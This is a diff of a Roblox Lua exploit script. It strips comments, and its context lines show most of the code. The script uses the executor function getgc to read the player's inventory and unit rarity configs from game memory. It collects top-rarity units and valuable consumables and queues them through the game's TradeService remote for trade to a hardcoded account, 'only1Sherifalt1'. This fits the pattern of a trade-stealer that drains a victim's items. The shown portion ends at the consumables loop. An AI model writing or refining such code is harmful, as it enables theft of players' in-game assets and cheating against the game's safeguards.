@@ -7,7 +7,6 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local TARGET_NAME = "only1Sherifalt1"
 local ADD_DELAY = 0.6
 
--- Rarity tiers to send (in order of preference) — must match entryConfig.rarity strings exactly
 local RARITY_TIERS = { "Mythic", "Secret II", "Secret I", "Celestial" }
 local RARITY_ACCEPT = {}
 for _, r in ipairs(RARITY_TIERS) do RARITY_ACCEPT[r] = true end
@@ -28,7 +27,6 @@ if not ok then
 	return
 end
 
--- Find the real inventory table (name/attributes/amount shape)
 local inventory = nil
 if getgc then
 	for _, t in ipairs(getgc(true)) do
@@ -48,9 +46,6 @@ if not inventory then
 	return
 end
 
--- Find the unit rarity config, preferring a stable module over live UI memory.
--- Primary: scan ReplicatedStorage ModuleScripts for a table keyed by unit name,
--- or a {entries = {name -> cfg}} table, where cfg.entryConfig.rarity exists.
 local function hasRarity(cfg)
 	if type(cfg) ~= "table" then return false end
 	local ec = rawget(cfg, "entryConfig")
@@ -58,13 +53,11 @@ local function hasRarity(cfg)
 end
 
 local function scanModule(result)
-	-- result itself is a name -> cfg table
 	for _, v in pairs(result) do
 		if hasRarity(v) then
 			return result
 		end
 	end
-	-- or it holds a nested {entries = {name -> cfg}} table
 	for _, v in pairs(result) do
 		if type(v) == "table" then
 			local entries = rawget(v, "entries")
@@ -100,7 +93,6 @@ if UnitConfigs then
 	print("[FOUND] Unit config module: " .. foundIn:GetFullName())
 end
 
--- Fallback: old getgc scan (depends on a UI widget being alive in memory)
 if not UnitConfigs and getgc then
 	print("[SCAN] Module scan failed, falling back to getgc scan (open your units/inventory menu for this to work)...")
 	for _, t in ipairs(getgc(true)) do
@@ -124,7 +116,6 @@ if not UnitConfigs then
 	return
 end
 
--- Build name -> rarity lookup
 local RARITY_LOOKUP = {}
 for name, cfg in pairs(UnitConfigs) do
 	if hasRarity(cfg) then
@@ -137,7 +128,6 @@ do
 	print("[FOUND] Rarity lookup built with " .. n .. " entries")
 end
 
--- Get remotes
 local network = RS:FindFirstChild("Network")
 local svc = network and network:FindFirstChild("TradeService")
 local RE = svc and svc:FindFirstChild("RE")
@@ -156,7 +146,6 @@ end
 
 local toTrade = {}
 
--- 1) Add units matching target rarity tiers
 print("[SCAN] Looking for " .. table.concat(RARITY_TIERS, "/") .. " units...")
 local unitCount = 0
 for uuid, item in pairs(inventory) do
@@ -171,7 +160,6 @@ for uuid, item in pairs(inventory) do
 end
 print("[SCAN] Found " .. unitCount .. " matching units")
 
--- 2) Add consumables
 local consumables = {"Trait Reroll", "Gems", "Lucky Spin", "Luck IV", "Luck III", "Luck II", "Luck I"}
 print("[SCAN] Looking for consumables...")
 for _, cname in ipairs(consumables) do
